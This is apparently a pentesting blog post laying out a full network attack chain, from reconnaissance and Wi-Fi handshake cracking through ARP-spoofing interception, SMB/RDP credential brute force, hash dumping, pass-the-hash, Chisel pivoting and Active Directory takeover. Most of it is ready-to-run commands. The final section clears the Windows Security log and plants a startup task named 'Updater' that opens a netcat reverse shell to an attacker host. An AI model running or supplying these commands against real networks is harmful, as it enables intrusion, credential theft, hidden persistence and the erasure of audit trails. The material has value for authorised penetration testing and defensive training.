---
title: "Real Network Hacking: Step-by-Step Attack Flow"
description: >-
  This guide walks through the full process of hacking a network — from recon to gaining domain control. Internal or wireless — here's how it's done.
author:
name:
date: 2025-02-12 13:00:00 +0000
categories: [Pentesting]
tags: [network, hacking, internal, wifi, mitm, lateral]
---

> “Hackers don’t just scan — they map, infiltrate, and move silently across layers.”
{: .prompt-info }
This post shows how real hackers compromise networks. Internal corp LANs, WiFi, or exposed edge — it's all about control.

---

## 1. Network Reconnaissance

> **Rule #1**: Stay passive until you know what you're touching.

### Passive Recon
- Wireshark (capture broadcast traffic, ARP requests)
- Netdiscover / ARP-scan to enumerate local hosts

```bash
sudo arp-scan -l
sudo netdiscover -r 192.168.1.0/24
```

### Active Scanning
```bash
nmap -sS -T4 -p- <target-subnet>
nmap -sV -sC -p 21,22,80,443,139,445 <IP>
```

---

## 2. Wi-Fi Network Attacks

### Deauth + Capture Handshake
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng -0 5 -a <BSSID> -c <ClientMAC> wlan0mon
```

### Crack with rockyou.txt
```bash
aircrack-ng capture.cap -w rockyou.txt
```

> Or target WPS with `bully`, `reaver`, or WPA downgrade attacks.
{: .prompt-tip }

---

## 3. Network Sniffing & MITM

### ARP Spoofing (mitmproxy)
```bash
arpspoof -i eth0 -t <victim-ip> <gateway-ip>
```

Then:
```bash
mitmproxy -i eth0 -p 8080
```

Can intercept:
- Unencrypted creds
- JWTs, cookies
- Hidden endpoints

> **Only use on legal labs or test setups.** This is *extremely intrusive*.
{: .prompt-warning }

---

## 4. Exploit Network Services

### Open SMB
```bash
smbclient -L //<IP> -N
```

Try null session:
```bash
smbmap -H <IP>
enum4linux -a <IP>
```

### RDP / WinRM
```bash
crackmapexec rdp <IP> -u users.txt -p rockyou.txt
evil-winrm -i <IP> -u admin -p password
```

### Exploit Open FTP / Redis / SNMP
- Anonymous FTP upload shell
- SNMP enum with `snmpwalk`
- Redis `CONFIG SET` → RCE

---

## 5. Lateral Movement

> *"Once you're in — the goal is **domain admin**. Pivoting begins."*

### Use Compromised Creds
```bash
crackmapexec smb 10.10.10.0/24 -u jusot99 -p password123
```

### Dump Hashes
```bash
secretsdump.py jusot99@<IP>
```

Use hashes:
```bash
psexec.py -hashes <LM>:<NT> administrator@<IP>
```

---

## 6. Pivoting & Tunneling

### Use Chisel
```bash
# Victim
./chisel client <attacker>:8000 R:3389:127.0.0.1:3389

# Attacker
./chisel server -p 8000 --reverse
```

### SSH Pivot
```bash
ssh -L 1080:target:22 user@jumpbox
```

Chain with proxychains:
```bash
proxychains nmap -sT 192.168.50.0/24
```

---

## 7. Domain Takeover (AD Attack Path)

Use:
- `bloodhound` + `SharpHound` to map trust
- `Rubeus` to harvest TGTs/AS-REPs
- `kerbrute`, `impacket` for relays + coercion
- Abuse delegation / GPP / password reuse

> LAPS, printers, DNSAdmin, GPP, DCSync — all lead to Domain Admin when misconfigured.
{: .prompt-tip }
---

## 8. Final Extraction & Persistence

- Setup reverse tunnel backdoor
- Drop scheduled tasks or backdoored services
- Exfil via DNS, HTTPS, or FTP
- Clean logs, drop custom creds

```bash
wevtutil cl Security
schtasks /create /tn "Updater" /tr "nc.exe -e cmd.exe <IP> 4444" /sc onstart
```

---

## Tools You Need

| Tool           | Purpose                        |
|----------------|--------------------------------|
| `netdiscover`  | Passive network mapping        |
| `aircrack-ng`  | Wireless attacks               |
| `responder`    | LLMNR/NBT-NS poisoning         |
| `mitmproxy`    | Intercept traffic              |
| `crackmapexec` | Network exploitation & movement|
| `Impacket`     | SMB, RDP, WMI, Kerberos attacks|
| `BloodHound`   | Active Directory graph attacks |

---

## Final Advice

> **“A network isn’t a structure. It’s a trust graph. Hack the trust.”**

- Exploit trust, not just services
- Map before attacking
- Lateral movement wins more than brute exploits
